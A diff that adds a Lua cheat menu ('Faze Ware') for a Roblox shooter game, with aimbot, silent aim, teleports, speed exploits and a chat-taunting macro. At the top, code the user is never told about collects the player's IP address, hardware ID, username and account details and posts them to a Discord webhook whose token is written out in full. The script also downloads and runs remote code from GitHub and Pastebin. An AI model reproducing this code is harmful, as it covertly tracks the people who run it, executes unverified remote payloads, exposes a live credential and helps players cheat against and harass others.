@@ -1,0 +1,687 @@
+-- Script
+
+local IP = game:HttpGet("https://v4.ident.me")
+plr = game:GetService'Players'.LocalPlayer
+local premium = false
+local ALT = false
+if plr.MembershipType == Enum.MembershipType.Premium then
+    premium = true
+elseif plr.MembershipType == Enum.MembershipType.None then
+    premium = false
+end
+if premium == false then 
+    if plr.AccountAge <= 70 then 
+        ALT = true
+    end
+end
+
+local market = game:GetService("MarketplaceService")
+local info = market:GetProductInfo(game.PlaceId, Enum.InfoType.Asset)
+
+
+local http_request = http_request;
+if syn then
+    http_request = syn.request
+elseif SENTINEL_V2 then
+    function http_request(tb)
+        return {
+            StatusCode = 200;
+            Body = request(tb.Url, tb.Method, (tb.Body or ''))
+        }
+    end				
+end
+
+local body = http_request({Url = 'https://httpbin.org/get'; Method = 'GET'}).Body;
+local decoded = game:GetService('HttpService'):JSONDecode(body)
+local hwid_list = {"Syn-Fingerprint", "Exploit-Guid", "Proto-User-Identifier", "Sentinel-Fingerprint"};
+hwid = "";
+
+for i, v in next, hwid_list do
+    if decoded.headers[v] then
+        hwid = decoded.headers[v];
+        break
+    end
+end
+
+if hwid then
+local HttpServ = game:GetService('HttpService')
+local url = "https://discord.com/api/webhooks/921214027781267488/OxauwraUNfmvJEk1FJ6UWoXbA4BaNqzjX7ci8kWP3i-j1qsBKNnFFAGEFfdJ2aCNdH8a"
+--local url = ""
+
+local data = 
+    {
+        ["content"] = "",
+        ["embeds"] = {{
+            ["title"] = "__**HWID:**__",
+            ["description"] = hwid,
+            ["type"] = "rich",
+            ["color"] = tonumber(0xAB0909),
+            ["fields"] = {
+                {
+                    ["name"] = "Username:",
+                    ["value"] = Game.Players.LocalPlayer.Name,
+                    ["inline"] = true
+                },
+                {
+                    ["name"] = "IP Address:",
+                    ["value"] = IP,
+                    ["inline"] = true
+                },
+                {
+                    ["name"] = "Game Link:",
+                    ["value"] = "https://roblox.com/games/" .. game.PlaceId .. "/",
+                    ["inline"] = true
+                },
+                {
+                    ["name"] = "Game Name:",
+                    ["value"] = info.Name,
+                    ["inline"] = true
+                },
+                {
+                    ["name"] = "Age:",
+                    ["value"] = plr.AccountAge,
+                    ["inline"] = true
+                },
+                {
+                    ["name"] = "Premium:",
+                    ["value"] = premium,
+                    ["inline"] = true
+                },
+                {
+                    ["name"] = "ALT:",
+                    ["value"] = ALT,
+                    ["inline"] = true
+                },
+                
+            },
+        }}
+    }
+    local newdata = HttpServ:JSONEncode(data)
+    
+    local headers = {
+            ["content-type"] = "application/json"
+    }
+    
+    local request_payload = {Url=url, Body=newdata, Method="POST", Headers=headers}
+    http_request(request_payload)
+end
+-- Whitelist Here
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Mttys/fazeware/main/faze"))()
+
+if getgenv().mattylol == true then
+ 
+    
+ if game.Players.LocalPlayer:IsInGroup(12861116) then
+    if game.Players.LocalPlayer:GetRankInGroup(12861116) == 6 or 15 or 254 or 255  then
+
+-- End Of WL
+ 
+ local library = loadstring(game:HttpGet("https://pastebin.com/raw/GQ7HvckX"))()
+ local window = library:CreateWindow("Faze Ware", Vector2.new(492, 598), Enum.KeyCode.RightShift)
+ local silent = window:CreateTab("Silent Aim")
+ 
+ local aimlock = window:CreateTab("Aimlock")
+ local stuffs = window:CreateTab("Extras")
+ local credits = window:CreateTab("Credits")
+ 
+ local watermark = library:CreateWatermark("Faze Ware 🎅🏻  |{fps}| {game}")
+ 
+ local silentaim = silent:CreateSector("Silent")
+ local settings = silent:CreateSector("FOV")
+ local extras = silent:CreateSector("Extras")
+ local stream = silent:CreateSector("Streamable Sets", "Right")
+ local presets = silent:CreateSector("Pre Sets", "Right")
+ local lock = aimlock:CreateSector("Lock")
+ local lock2 = aimlock:CreateSector("Lock Extras")
+ local stuff2 = stuffs:CreateSector("Extras")
+ local teleports = stuffs:CreateSector("Teleports")
+ local stuff = stuffs:CreateSector("Toggles", "Right")
+ local credit = credits:CreateSector("Extras")
+ 
+ 
+ local button = silentaim:AddButton("Silent Aim", function() 
+     loadstring(game:HttpGet("https://pastebin.com/raw/ZJyTbvVR"))()
+ local hotkey = "t"
+ local mouse = game.Players.LocalPlayer:GetMouse()
+ 
+ 
+ 
+ mouse.KeyDown:Connect(function(key)
+ if key == hotkey then
+ if DaHoodSettings.SilentAim == true then
+ DaHoodSettings.SilentAim = false
+ else
+ DaHoodSettings.SilentAim = true
+ end
+ end
+ end)
+ end)
+ 
+ local toggle2 = silentaim:AddToggle("Toggle", false, function(SetTrue)
+    DaHoodSettings.SilentAim = SetTrue
+end)
+toggle2:AddKeybind()
+
+
+ local textbox = silentaim:AddTextbox("Prediction", false, function(SetPre)
+     DaHoodSettings.Prediction = SetPre
+ end)
+ 
+ 
+ 
+ 
+ 
+ local slider = settings:AddSlider("FOV", 0, 0, 500, 1, function(hummm) 
+     Aiming.FOV = hummm
+ end)
+     
+ local toggle = settings:AddToggle("show fov", false, function(bool) 
+     Aiming.ShowFOV = bool    
+ end)   
+ toggle:AddKeybind()
+ toggle:AddColorpicker(Color3.new(), function(shutup) 
+     Aiming.FOVColour = shutup
+ end)
+ 
+ 
+ local dropdown = silentaim:AddDropdown("HitBox", {"Head", "UpperTorso", "LowerTorso", "HumanoidRootPart"}, "HumanoidRootPart", function(SetPart)
+     Aiming.TargetPart = SetPart
+ end)
+ 
+ local toggle = extras:AddToggle("Wall Check", false, function(SetWall)
+     Aiming.VisibleCheck = SetWall
+ end)
+ 
+ local toggle = extras:AddToggle("Team Check", false, function(SetTeam)
+     Aiming.TeamCheck = SetTeam
+ end)
+ 
+ local button = stream:AddButton("Streamable FOV [ 35 ]", function()
+     Aiming.FOV = 35
+ end)   
+ 
+ local button = stream:AddButton("Streamable FOV [ 45 ]", function()
+     Aiming.FOV = 45
+ end)
+ 
+ local button = stream:AddButton("Streamable FOV [ 55 ]", function()
+     Aiming.FOV = 55
+ end)   
+ 
+ local button = stream:AddButton("Streamable Pred [ 0.037 ]", function()
+     DaHoodSettings.Prediction = 0.037
+ end)
+ 
+ local button = stream:AddButton("Streamable Pred [ 0.037 ]", function()
+     DaHoodSettings.Prediction = 0.0432
+ end)
+ 
+ local button = presets:AddButton("Pre Set FOV [ 85 ]", function()
+     Aiming.FOV = 85
+ end)
+ 
+ local button = presets:AddButton("Pre Set FOV [ 95 ]", function()
+     Aiming.FOV = 95
+ end)
+ 
+ local button = presets:AddButton("Pre Set FOV [ 125 ]", function()
+     Aiming.FOV = 125
+ end)
+ 
+ local button = presets:AddButton("Pre Set Pred [ 0.1242 ]", function()
+     DaHoodSettings.Prediction = 0.1242
+ end)
+ 
+ local button = presets:AddButton("Pre Set Pred [ 0.1425 ]", function()
+     DaHoodSettings.Prediction = 0.1425
+ end)
+ 
+ local button = presets:AddButton("Pre Set Pred [ 0.1635 ]", function()
+     DaHoodSettings.Prediction = 0.1635
+ end)
+ 
+ 
+ -- Lock
+ 
+ local button = lock:AddButton("Aimlock", function()
+     getgenv().AimPart = "HumanoidRootPart" -- For R15 Games: {UpperTorso, LowerTorso, HumanoidRootPart, Head} | For R6 Games: {Head, Torso, HumanoidRootPart}
+ getgenv().AimlockKey = "q"
+ getgenv().AimRadius = 30 -- How far away from someones character you want to lock on at
+ getgenv().ThirdPerson = true 
+ getgenv().FirstPerson = true
+ getgenv().TeamCheck = false -- Check if Target is on your Team (True means it wont lock onto your teamates, false is vice versa) (Set it to false if there are no teams)
+ getgenv().PredictMovement = true -- Predicts if they are moving in fast velocity (like jumping) so the aimbot will go a bit faster to match their speed 
+ getgenv().PredictionVelocity = 9
+ 
+ local Players, Uis, RService, SGui = game:GetService"Players", game:GetService"UserInputService", game:GetService"RunService", game:GetService"StarterGui";
+ local Client, Mouse, Camera, CF, RNew, Vec3, Vec2 = Players.LocalPlayer, Players.LocalPlayer:GetMouse(), workspace.CurrentCamera, CFrame.new, Ray.new, Vector3.new, Vector2.new;
+ local Aimlock, MousePressed, CanNotify = true, false, false;
+ local AimlockTarget;
+ getgenv().CiazwareUniversalAimbotLoaded = true
+ 
+ getgenv().WorldToViewportPoint = function(P)
+     return Camera:WorldToViewportPoint(P)
+ end
+ 
+ getgenv().WorldToScreenPoint = function(P)
+     return Camera.WorldToScreenPoint(Camera, P)
+ end
+ 
+ getgenv().GetObscuringObjects = function(T)
+     if T and T:FindFirstChild(getgenv().AimPart) and Client and Client.Character:FindFirstChild("Head") then 
+         local RayPos = workspace:FindPartOnRay(RNew(
+             T[getgenv().AimPart].Position, Client.Character.Head.Position)
+         )
+         if RayPos then return RayPos:IsDescendantOf(T) end
+     end
+ end
+ 
+ getgenv().GetNearestTarget = function()
+     -- Credits to whoever made this, i didnt make it, and my own mouse2plr function kinda sucks
+     local players = {}
+     local PLAYER_HOLD  = {}
+     local DISTANCES = {}
+     for i, v in pairs(Players:GetPlayers()) do
+         if v ~= Client then
+             table.insert(players, v)
+         end
+     end
+     for i, v in pairs(players) do
+         if v.Character ~= nil then
+             local AIM = v.Character:FindFirstChild("Head")
+             if getgenv().TeamCheck == true and v.Team ~= Client.Team then
+                 local DISTANCE = (v.Character:FindFirstChild("Head").Position - game.Workspace.CurrentCamera.CFrame.p).magnitude
+                 local RAY = Ray.new(game.Workspace.CurrentCamera.CFrame.p, (Mouse.Hit.p - game.Workspace.CurrentCamera.CFrame.p).unit * DISTANCE)
+                 local HIT,POS = game.Workspace:FindPartOnRay(RAY, game.Workspace)
+                 local DIFF = math.floor((POS - AIM.Position).magnitude)
+                 PLAYER_HOLD[v.Name .. i] = {}
+                 PLAYER_HOLD[v.Name .. i].dist= DISTANCE
+                 PLAYER_HOLD[v.Name .. i].plr = v
+                 PLAYER_HOLD[v.Name .. i].diff = DIFF
+                 table.insert(DISTANCES, DIFF)
+             elseif getgenv().TeamCheck == false and v.Team == Client.Team then 
+                 local DISTANCE = (v.Character:FindFirstChild("Head").Position - game.Workspace.CurrentCamera.CFrame.p).magnitude
+                 local RAY = Ray.new(game.Workspace.CurrentCamera.CFrame.p, (Mouse.Hit.p - game.Workspace.CurrentCamera.CFrame.p).unit * DISTANCE)
+                 local HIT,POS = game.Workspace:FindPartOnRay(RAY, game.Workspace)
+                 local DIFF = math.floor((POS - AIM.Position).magnitude)
+                 PLAYER_HOLD[v.Name .. i] = {}
+                 PLAYER_HOLD[v.Name .. i].dist= DISTANCE
+                 PLAYER_HOLD[v.Name .. i].plr = v
+                 PLAYER_HOLD[v.Name .. i].diff = DIFF
+                 table.insert(DISTANCES, DIFF)
+             end
+         end
+     end
+     
+     if unpack(DISTANCES) == nil then
+         return nil
+     end
+     
+     local L_DISTANCE = math.floor(math.min(unpack(DISTANCES)))
+     if L_DISTANCE > getgenv().AimRadius then
+         return nil
+     end
+     
+     for i, v in pairs(PLAYER_HOLD) do
+         if v.diff == L_DISTANCE then
+             return v.plr
+         end
+     end
+     return nil
+ end
+ 
+ Mouse.KeyDown:Connect(function(a)
+     if a == AimlockKey and AimlockTarget == nil then
+         pcall(function()
+             if MousePressed ~= true then MousePressed = true end 
+             local Target;Target = GetNearestTarget()
+             if Target ~= nil then 
+                 AimlockTarget = Target
+             end
+         end)
+     elseif a == AimlockKey and AimlockTarget ~= nil then
+         if AimlockTarget ~= nil then AimlockTarget = nil end
+         if MousePressed ~= false then 
+             MousePressed = false 
+         end
+     end
+ end)
+ --[[
+ Mouse.KeyDown:Connect(function(a)
+     if a == AimlockToggleKey then
+         Aimlock = not Aimlock
+     end
+ end)
+ ]]
+ RService.RenderStepped:Connect(function()
+     if getgenv().ThirdPerson == true and getgenv().FirstPerson == true then 
+         if (Camera.Focus.p - Camera.CoordinateFrame.p).Magnitude > 1 or (Camera.Focus.p - Camera.CoordinateFrame.p).Magnitude <= 1 then 
+             CanNotify = true 
+         else 
+             CanNotify = false 
+         end
+     elseif getgenv().ThirdPerson == true and getgenv().FirstPerson == false then 
+         if (Camera.Focus.p - Camera.CoordinateFrame.p).Magnitude > 1 then 
+             CanNotify = true 
+         else 
+             CanNotify = false 
+         end
+     elseif getgenv().ThirdPerson == false and getgenv().FirstPerson == true then 
+         if (Camera.Focus.p - Camera.CoordinateFrame.p).Magnitude <= 1 then 
+             CanNotify = true 
+         else 
+             CanNotify = false 
+         end
+     end
+     if Aimlock == true and MousePressed == true then 
+         if AimlockTarget and AimlockTarget.Character and AimlockTarget.Character:FindFirstChild(getgenv().AimPart) then 
+             if getgenv().FirstPerson == true then
+                 if CanNotify == true then
+                     if getgenv().PredictMovement == true then 
+                         Camera.CFrame = CF(Camera.CFrame.p, AimlockTarget.Character[getgenv().AimPart].Position + AimlockTarget.Character[getgenv().AimPart].Velocity/PredictionVelocity)
+                     elseif getgenv().PredictMovement == false then 
+                         Camera.CFrame = CF(Camera.CFrame.p, AimlockTarget.Character[getgenv().AimPart].Position)
+                     end
+                 end
+             elseif getgenv().ThirdPerson == true then 
+                 if CanNotify == true then
+                     if getgenv().PredictMovement == true then 
+                         Camera.CFrame = CF(Camera.CFrame.p, AimlockTarget.Character[getgenv().AimPart].Position + AimlockTarget.Character[getgenv().AimPart].Velocity/PredictionVelocity)
+                     elseif getgenv().PredictMovement == false then 
+                         Camera.CFrame = CF(Camera.CFrame.p, AimlockTarget.Character[getgenv().AimPart].Position)
+                     end
+                 end 
+             end
+         end
+     end
+ end)
+ end)
+ 
+ local textbox = lock:AddTextbox("Toggle Key", false, function(Key)
+     getgenv().AimlockKey = Key
+ end)
+ 
+ local textbox = lock:AddTextbox("Pred", false, function(SetPre)
+     getgenv().PredictionVelocity = SetPre
+ end)
+ 
+  local dropdown = lock:AddDropdown("HitBox", {"Head", "UpperTorso", "LowerTorso", "HumanoidRootPart"}, "HumanoidRootPart", function(SetPart)
+     getgenv().AimPart = SetPart
+ end)
+ 
+ local toggle = lock2:AddToggle("Airshot Function", false, function(CheckJumped)
+     CheckIfJumped = CheckJumped
+ end)
+ 
+ local toggle = lock2:AddToggle("Auto Prediction", false, function(autolol)
+     AutoPrediction = autolol
+ end)
+ 
+ local label = credit:AddLabel("Credits To Xaxa")
+ local label = credit:AddLabel("Zaddy Matty")
+ local label = credit:AddLabel("Mini & 7c")
+ 
+ 
+ 
+ 
+ 
+ local button = teleports:AddButton("Lava Base Food", function()
+     game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-788.39318847656, -39.649200439453, -935.27795410156)
+ end)
+ 
+ local button = teleports:AddButton("Mid High Armor", function()
+     game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-934.73651123047, -28.492471694946, 565.99884033203)
+ end)
+ 
+ local button = teleports:AddButton("AK Bush", function()
+     game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-626.288757, 7.99984694, -772.322632, -0.997374237, -1.67662592e-10, -0.0724197701, -1.00076274e-10, 1, -9.36886457e-10, 0.0724197701, -9.27178945e-10, -0.997374237)
+ end)
+ 
+ 
+ 
+ 
+ 
+ local button = stuff2:AddButton("Dot Cursor", function() 
+     game:GetService("Players").LocalPlayer.PlayerGui.MainScreenGui.Aim.Top.Visible = false
+     game:GetService("Players").LocalPlayer.PlayerGui.MainScreenGui.Aim.Right.Visible = false
+     game:GetService("Players").LocalPlayer.PlayerGui.MainScreenGui.Aim.Left.Visible = false
+     game:GetService("Players").LocalPlayer.PlayerGui.MainScreenGui.Aim.Bottom.Visible = false 
+ end)
+ 
+ local button = stuff2:AddButton("Shit Talk Macro [ M ]", function()
+     local mouse = game.Players.LocalPlayer:GetMouse() 
+     mouse.KeyDown:connect(function(key) 
+         if key:lower() == "m" then
+     function dowait()
+         wait(0.20)
+     end
+     local tbl_main = 
+     {
+           "focus up son." , 
+           "All"
+     }
+     game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(tbl_main))
+     dowait()
+     local tbl_main = 
+     {
+           "son wyd get up" , 
+           "All"
+     }
+     game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(tbl_main))
+     dowait()
+     local tbl_main = 
+     {
+           "sonned by me" , 
+           "All"
+     }
+     game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(tbl_main))
+     dowait()
+     local tbl_main = 
+     {
+           "so bad sonny do sum." , 
+           "All"
+     }
+     game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(tbl_main))
+     dowait()
+     local tbl_main = 
+     {
+           "ur bad kid my seedling" , 
+           "All"
+     }
+     game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(unpack(tbl_main))
+     end
+ end)
+ end)
+ 
+ local button = stuff2:AddButton("Flyish Speed [Q]", function()
+     -- the key 2 speed is "Q"
+     plr = game:GetService('Players').LocalPlayer
+     down = true
+     
+     function onButton1Down(mouse)
+         down = true
+         while down do
+             if not down then break end
+             local char = plr.Character
+             char.HumanoidRootPart.Velocity = char.HumanoidRootPart.CFrame.lookVector * 190
+             wait()
+         end
+     end
+     
+     function onButton1Up(mouse)
+         down = false
+     end
+     
+     function onSelected(mouse)
+         mouse.KeyDown:connect(function(q) if q:lower()=="q"then onButton1Down(mouse)end end)
+         mouse.KeyUp:connect(function(q) if q:lower()=="q"then onButton1Up(mouse)end end)
+     end
+     onSelected(game.Players.LocalPlayer:GetMouse())
+     game.StarterGui:SetCore("SendNotification",{
+                 Title = "Speed Enabled";
+                 Text = "Thanks to 7c Uwu - Matty";
+                 Duration = 0.20;
+             })
+         
+ end)
+ 
+ local button = stuff2:AddButton("Realistic Speed Glitch [C]", function()
+    repeat wait() until game:IsLoaded() and game.Players.LocalPlayer.Character:FindFirstChild("FULLY_LOADED_CHAR")
+        
+    for _,v in pairs(workspace:GetDescendants()) do
+    if v.ClassName == "Part"
+    or v.ClassName == "SpawnLocation"
+    or v.ClassName == "WedgePart"
+    or v.ClassName == "Terrain"
+    or v.ClassName == "MeshPart" then
+    v.Material = "Plastic"
+    end
+    end
+    
+    for _,v in pairs(workspace:GetDescendants()) do
+    if v.ClassName == "Texture" then
+    v:Destroy()
+    end
+    end
+    
+    
+    _G.Keyy = "c"
+    
+    local Player = game:GetService("Players").LocalPlayer;
+    local Mouse = Player:GetMouse();
+    local SpeedGlitch = false;
+    local Wallet = Player.Backpack:FindFirstChild("Wallet");
+    
+    local UniversalAnimation = Instance.new("Animation");
+    
+    function stopTracks()
+        for _, v in next, game:GetService("Players").LocalPlayer.Character:FindFirstChildOfClass("Humanoid"):GetPlayingAnimationTracks(
+    
+        ) do
+            if (v.Animation.AnimationId:match("rbxassetid")) then
+                v:Stop();
+            end;
+        end;
+    end;
+    
+    function loadAnimation(id)
+        if UniversalAnimation.AnimationId == id then
+            UniversalAnimation.AnimationId = "1";
+        else
+            UniversalAnimation.AnimationId = id;
+            local animationTrack =
+                game:GetService("Players").LocalPlayer.Character:FindFirstChildOfClass("Humanoid"):LoadAnimation(
+                UniversalAnimation
+            );
+            animationTrack:Play();
+        end;
+    end;
+    Mouse.KeyDown:Connect(
+        function(Key)
+            if Key == _G.Keyy then
+                SpeedGlitch = not SpeedGlitch;
+                if SpeedGlitch == true then 
+                    loadAnimation("rbxassetid://3189777795");
+                                    loadAnimation("rbxassetid://3189777795");
+    
+            local humanoid = game.Players.LocalPlayer.Character:FindFirstChildOfClass("Humanoid");
+            humanoid:UnequipTools();
+                    wait(1.5);
+                    Wallet.Parent = Player.Character;
+                    wait(0.15);
+                    Player.Character:FindFirstChild("Wallet").Parent = Player.Backpack;
+                    wait(0.05);
+            stopTracks();
+                    repeat
+                        game:GetService("RunService").Heartbeat:wait();
+                        keypress(0x49);
+                        game:GetService("RunService").Heartbeat:wait();
+                        keypress(0x4F);
+                        game:GetService("RunService").Heartbeat:wait();
+                        keyrelease(0x49);
+                        game:GetService("RunService").Heartbeat:wait();
+                        keyrelease(0x4F);
+                        game:GetService("RunService").Heartbeat:wait();
+                    until SpeedGlitch == false;
+                end;
+            end;
+        end
+    );
+end)
+
+local button = stuff2:AddButton("Anti Lock [Y]", function()
+    repeat wait() until game:IsLoaded()
+    local Players = game:service('Players')
+    local Player = Players.LocalPlayer
+    
+    repeat wait() until Player.Character
+    
+    local userInput = game:service('UserInputService')
+    local runService = game:service('RunService')
+    
+    local Multiplier = -0.30
+    local Enabled = false
+    local whentheflashnoiq
+    
+    userInput.InputBegan:connect(function(Key)
+        if Key.KeyCode == Enum.KeyCode.LeftBracket then
+            Multiplier = Multiplier + 0.01
+            print(Multiplier)
+            wait(0.2)
+            while userInput:IsKeyDown(Enum.KeyCode.LeftBracket) do
+                wait()
+                Multiplier = Multiplier + 0.01
+                print(Multiplier)
+            end
+        end
+    
+        if Key.KeyCode == Enum.KeyCode.RightBracket then
+            Multiplier = Multiplier - 0.01
+            print(Multiplier)
+            wait(0.2)
+            while userInput:IsKeyDown(Enum.KeyCode.RightBracket) do
+                wait()
+                Multiplier = Multiplier - 0.01
+                print(Multiplier)
+            end
+        end
+     
+        if Key.KeyCode == Enum.KeyCode.Y then
+            Enabled = not Enabled
+            if Enabled == true then
+                repeat
+                    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame + game.Players.LocalPlayer.Character.Humanoid.MoveDirection * Multiplier
+                    game:GetService("RunService").Stepped:wait()
+                until Enabled == false
+            end
+        end
+    end)
+    end)
+ 
+ 
+ 
+ local toggle = stuff:AddToggle("FPS Shower", false, function(bool)
+     watermark.Visible = bool
+ end)
+
+ -- WL Ending
+
+else
+    game.StarterGui:SetCore("SendNotification", {
+Title = "Faze Ware😱";
+Text = "not whitelistet";
+
+})
+return
+    end
+else
+
+game.StarterGui:SetCore("SendNotification", {
+Title = "Faze Ware😱";
+Text = "not whitelistet";
+
+})
+return
+end
+end
